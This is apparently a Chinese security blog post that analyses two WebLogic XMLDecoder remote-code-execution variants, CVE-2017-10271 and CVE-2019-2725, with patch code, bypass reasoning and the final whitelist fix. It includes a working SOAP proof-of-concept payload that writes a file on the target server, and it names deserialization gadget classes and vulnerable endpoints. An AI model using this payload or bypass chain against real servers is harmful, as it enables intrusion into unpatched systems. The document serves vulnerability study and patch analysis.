#XMLDecoder RCE变种
2020/1/31 @PanicaII

##描述

继前一篇《XMLDecoder RCE起源》介绍的CVE-2017-3506后，官方发布了补丁，但是补丁过于简单，于是很快出现了CVE-2017-10271；官方补完CVE-2017-10271后，又出现了CVE-2019-2725，于是又发补丁。

本文简单介绍自起源之后的两个变种，分别是CVE-2017-10271和CVE-2017-2725。



## 变种一： CVE-2017-10271

### CVE-2017-3506补丁的问题

先看看3506的补丁：

```java
public WorkContextXmlInputAdapter(InputStream is) {
    ByteArrayOutputStream baos = new ByteArrayOutputStream();

    try {
        int next = false;

        for(int next = is.read(); next != -1; next = is.read()) {
            baos.write(next);
        }
    } catch (Exception var4) {
        throw new IllegalStateException("Failed to get data from input stream", var4);
    }

    this.validate(new ByteArrayInputStream(baos.toByteArray()));
    this.xmlDecoder = new XMLDecoder(new ByteArrayInputStream(baos.toByteArray()));
}

private void validate(InputStream is) {
    WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();

    try {
        SAXParser parser = factory.newSAXParser();
        parser.parse(is, new DefaultHandler() {
            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
                if (qName.equalsIgnoreCase("object")) {
                    throw new IllegalStateException("Invalid context type: object");
                }
            }
        });
    } catch (SAXException | IOException | ParserConfigurationException var5) {
        throw new IllegalStateException("Parser Exception", var5);
    }
}
```

信息 1

这个补丁主要是在`WorkContextXmlInputAdapter`构造函数里面增加了一个验证的代码，验证的逻辑也非常简单：使用SAX解析XML，只要发现有标签是`object`直接异常退出。

这个补丁针对之前3506的PoC是有效的，但是后来有人发现了新的XML书写方法，可以绕过这个补丁。

### PoC

Post URL: http://172.16.100.97:7001/wls-wsat/CoordinatorPortType

Post Body:

```xml
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    	<soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java version="1.6.0" class="java.beans.XMLDecoder">
                    <void class="java.io.PrintWriter">
                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt</string><void method="println">
                        <string>xmldecoder_vul_test444</string></void><void method="close"/>
                    </void>
                </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
    </soapenv:Envelope>
```
信息 2

可以看到这个PoC和CVE-2017-3506的唯一区别就是，将`object`标签换成了`void`。

翻一下JDK里面关于`object`标签和`void`标签的区别：

`com/sun/beans/decoder/VoidElementHandler.java`

```Java
final class VoidElementHandler extends ObjectElementHandler {

    /**
     * Tests whether the value of this element can be used
     * as an argument of the element that contained in this one.
     *
     * @return {@code true} if the value of this element should be used
     *         as an argument of the element that contained in this one,
     *         {@code false} otherwise
     */
    @Override
    protected boolean isArgument() {
        return false; // hack for compatibility
    }
}
```

信息 3

可以看到`void`标签的处理方法就是继承自`object`标签，所以才会有相同的效果。

### 

## 变种二： CVE-2019-2725

### CVE-2017-10271补丁的问题

先看看补丁代码：

```java
public WorkContextXmlInputAdapter(InputStream var1) {

        ByteArrayOutputStream var2 = new ByteArrayOutputStream();

        try {

            boolean var3 = false;

            for(int var5 = var1.read(); var5 != -1; var5 = var1.read()) {
                var2.write(var5);
            }

        } catch (Exception var4) {
            throw new IllegalStateException(“Failed to get data from input stream”, var4);
        }

        this.validate(new ByteArrayInputStream(var2.toByteArray()));

        this.xmlDecoder = new XMLDecoder(new ByteArrayInputStream(var2.toByteArray()));

    }

    private void validate(InputStream var1) {

        WebLogicSAXParserFactory var2 = new WebLogicSAXParserFactory();

        try {

            SAXParser var3 = var2.newSAXParser();

            var3.parse(var1, new DefaultHandler() {

                private int overallarraylength = 0;

                public void startElement(String var1, String var2, String var3, Attributes var4) throws SAXException {

                    if (var3.equalsIgnoreCase(“object”)) {

                        throw new IllegalStateException(“Invalid element qName:object”);

                    } else if (var3.equalsIgnoreCase(“new”)) {

                        throw new IllegalStateException(“Invalid element qName:new”);

                    } else if (var3.equalsIgnoreCase(“method”)) {

                        throw new IllegalStateException(“Invalid element qName:method”);

                    } else {

                        if (var3.equalsIgnoreCase(“void”)) {

                            for(int var5 = 0; var5 < var4.getLength(); ++var5) {

                                if (!”index”.equalsIgnoreCase(var4.getQName(var5))) {

                                    throw new IllegalStateException(“Invalid attribute for element void:” + var4.getQName(var5));

                                }

                            }

                        }

                        if (var3.equalsIgnoreCase(“array”)) {

                            String var9 = var4.getValue(“class”);

                            if (var9 != null && !var9.equalsIgnoreCase(“byte”)) {

                                throw new IllegalStateException(“The value of class attribute is not valid for array element.”);

                            }

                            String var6 = var4.getValue(“length”);

                            if (var6 != null) {

                                try {

                                    int var7 = Integer.valueOf(var6);

                                    if (var7 >= WorkContextXmlInputAdapter.MAXARRAYLENGTH) {

                                        throw new IllegalStateException(“Exceed array length limitation”);
                                    }

                                    this.overallarraylength += var7;

                                    if (this.overallarraylength >= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) {

                                        throw new IllegalStateException(“Exceed over all array limitation.”);

                                    }

                                } catch (NumberFormatException var8) {
                                    ;
                                }
```

信息 4

补丁限制了标签名不能是`object`,`new`,`method`。并且，如果是`void`，那么后面跟的属性名只能是`index`；如果是`array`，后面可以跟`class`属性，但是`class`的类型只能是`byte`，并且`array`后面如果有长度`length`，那么`length`的值也做了限制（<MAXARRAYLENGTH），且整个xml的`length`累加值也做了限制（<OVERALLMAXARRAYLENGTH）。

### PoC

根据公开信息`参考 3`,使用了`class`标签以及`oracle.toplink.internal.sessions.UnitOfWorkChangeSet`。

这样的组合方式可以绕过补丁的原因是，`class`标签没有被过滤，但也只有`class`标签，可以生成实例，但不能调用方法，因为`method`被禁用了。所以思路被固定了，只有一个类的实例可以被构造，即某个类的构造函数可以被执行。

于是，`UnitOfWorkChangeSet`这个类被找出来了，看看这个类的构造函数代码：

`oracle/toplink/internal/sessions/UnitOfWorkChangeSet.class`

```java
public UnitOfWorkChangeSet(byte[] bytes) throws IOException, ClassNotFoundException {
    ByteArrayInputStream byteIn = new ByteArrayInputStream(bytes);
    ObjectInputStream objectIn = new ObjectInputStream(byteIn);
    this.allChangeSets = (IdentityHashtable)objectIn.readObject();
    this.deletedObjects = (IdentityHashtable)objectIn.readObject();
}
```

信息 5

构造函数直接将输入的数据反序列化，且满足array+byte限制，所以只要能找到一个可用的gadget即可，可以参考ysoserial项目。

最终构造的PoC类似如下（见`参考 2`）：

![image-20200131210600589](/images/Weblogic/image-20200131210600589.png)

​		信息 6

另外还有一些其他的方法，比如`参考 2`中提到的`org.slf4j.ext.EventData`

```java
 public EventData(String xml) {

        ByteArrayInputStream bais = new ByteArrayInputStream(xml.getBytes());



        try {

            XMLDecoder decoder = new XMLDecoder(bais);

            this.eventData = (Map)decoder.readObject();

        } catch (Exception var4) {

            throw new EventException(“Error decoding ” + xml, var4);

        }

    }
```

信息 7

相当的简单粗暴，二次XMLDecoder。



### 补丁

参考代码如下：

```java
public final class WorkContextXmlInputAdapter implements WorkContextInput {
    public static final String WORKCONTEXTARRAYLENGHPROPERTY = "weblogic.wsee.workarea.arraylength";
    public static final String WORKCONTEXTOVERALLARRAYLENGHPROPERTY = "weblogic.wsee.workarea.overallarraylength";
    private static final int MAXARRAYLENGTH = Integer.getInteger("weblogic.wsee.workarea.arraylength", 10000);
    private static final int OVERALLMAXARRAYLENGTH = Integer.getInteger("weblogic.wsee.workarea.overallarraylength", 100000);
    private final XMLDecoder xmlDecoder;

    public WorkContextXmlInputAdapter(InputStream is) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        try {
            int next = false;

            for(int next = is.read(); next != -1; next = is.read()) {
                baos.write(next);
            }
        } catch (Exception var4) {
            throw new IllegalStateException("Failed to get data from input stream", var4);
        }

        this.validate(new ByteArrayInputStream(baos.toByteArray()));
        this.validateFormat(new ByteArrayInputStream(baos.toByteArray()));
        this.xmlDecoder = new XMLDecoder(new ByteArrayInputStream(baos.toByteArray()));
    }

    private void validateFormat(InputStream is) {
        WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();

        try {
            SAXParser parser = factory.newSAXParser();
            parser.parse(is, new DefaultHandler() {
                public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
                    if (!WorkContextFormatInfo.allowedName.containsKey(qName)) {
                        throw new IllegalStateException("Invalid element qName:" + qName);
                    } else {
                        Map<String, String> attributeMap = (Map)WorkContextFormatInfo.allowedName.get(qName);
                        if (attributeMap == null && attributes.getLength() > 0) {
                            throw new IllegalStateException("Invalid attribute for element qName:" + qName);
                        } else {
                            for(int i = 0; i < attributes.getLength(); ++i) {
                                String attrName = attributes.getQName(i);
                                if (!attributeMap.containsKey(attrName)) {
                                    throw new IllegalStateException("Invalid attribute for element qName:" + qName + ", current attribute Name is:" + attrName);
                                }

                                String attrValue = (String)attributeMap.get(attrName);
                                if (!"any".equals(attrValue) && !attrValue.equals(attributes.getValue(i))) {
                                    throw new IllegalStateException("The value of attribute is not valid:  element qName:" + qName + ", current attribute Name is:" + attrName + ", current attribute values is: " + attributes.getValue(i));
                                }
                            }

                        }
                    }
                }
            });
        } catch (SAXException | IOException | ParserConfigurationException var5) {
            throw new IllegalStateException("Parser Exception", var5);
        }
    }

    private void validate(InputStream is) {
        WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();

        try {
            SAXParser parser = factory.newSAXParser();
            parser.parse(is, new DefaultHandler() {
                private int overallarraylength = 0;

                public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
                    if (qName.equalsIgnoreCase("object")) {
                        throw new IllegalStateException("Invalid element qName:object");
                    } else if (qName.equalsIgnoreCase("class")) {
                        throw new IllegalStateException("Invalid element qName:class");
                    } else if (qName.equalsIgnoreCase("new")) {
                        throw new IllegalStateException("Invalid element qName:new");
                    } else if (qName.equalsIgnoreCase("method")) {
                        throw new IllegalStateException("Invalid element qName:method");
                    } else {
                        if (qName.equalsIgnoreCase("void")) {
                            for(int i = 0; i < attributes.getLength(); ++i) {
                                if (!"index".equalsIgnoreCase(attributes.getQName(i))) {
                                    throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(i));
                                }
                            }
                        }

                        if (qName.equalsIgnoreCase("array")) {
                            String attClass = attributes.getValue("class");
                            if (attClass != null && !attClass.equalsIgnoreCase("byte")) {
                                throw new IllegalStateException("The value of class attribute is not valid for array element.");
                            }

                            String lengthString = attributes.getValue("length");
                            if (lengthString != null) {
                                try {
                                    int length = Integer.valueOf(lengthString);
                                    if (length >= WorkContextXmlInputAdapter.MAXARRAYLENGTH) {
                                        throw new IllegalStateException("Exceed array length limitation");
                                    }

                                    this.overallarraylength += length;
                                    if (this.overallarraylength >= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) {
                                        throw new IllegalStateException("Exceed over all array limitation.");
                                    }
                                } catch (NumberFormatException var8) {
                                }
                            }
                        }

                    }
                }
            });
        } catch (SAXException | IOException | ParserConfigurationException var5) {
            throw new IllegalStateException("Parser Exception", var5);
        }
    }
```

信息 8

在CVE-2017-10271的基础上，又加了对标签`class`的限制；另外完整添加了一个新的验证方法：`validateFormat`。`validateFormat`完全是一个白名单验证方法，涵盖了标签、属性名和属性内容。

关于白名单内容，搜索代码后可知：

`weblogic/wsee/workarea/WorkContextFormatInfo.class`

```java
public class WorkContextFormatInfo {
    public static final Map<String, Map<String, String>> allowedName = new HashMap();

    public WorkContextFormatInfo() {
    }

    static {
        allowedName.put("string", (Object)null);
        allowedName.put("int", (Object)null);
        allowedName.put("long", (Object)null);
        Map<String, String> allowedAttr = new HashMap();
        allowedAttr.put("class", "byte");
        allowedAttr.put("length", "any");
        allowedName.put("array", allowedAttr);
        allowedAttr = new HashMap();
        allowedAttr.put("index", "any");
        allowedName.put("void", allowedAttr);
        allowedName.put("byte", (Object)null);
        allowedName.put("boolean", (Object)null);
        allowedName.put("short", (Object)null);
        allowedName.put("char", (Object)null);
        allowedName.put("float", (Object)null);
        allowedName.put("double", (Object)null);
        allowedAttr = new HashMap();
        allowedAttr.put("class", "java.beans.XMLDecoder");
        allowedAttr.put("version", "any");
        allowedName.put("java", allowedAttr);
    }
}
```

信息 9

代码还是比较清晰的，和`validate`方法的黑名单有部分重复。白名单的防范方式要更好一些，可防可控。

### 其他

需要注意的是，公开信息显示，到达`WorkContextXmlInputAdapter`的URL入口除了之前CVE-2017-10271 PoC展示的`wls-wsat/xxx`，如`wls-wsat/CoordinatorPortType`; 还有`_async/xxx`，如`_async/AsyncResponseService`。

## 参考

[1]: https://www.cnvd.org.cn/webinfo/show/4989	"Oracle WebLogic wls9-async公告"
[2]: http://www.secwk.com/2019/05/05/4006/	"WebLogic RCE(CVE-2019-2725)漏洞之旅"
[3]: https://xz.aliyun.com/t/5024	"Weblogic 远程命令执行漏洞分析(CVE-2019-2725)及利用payload构造详细解读"

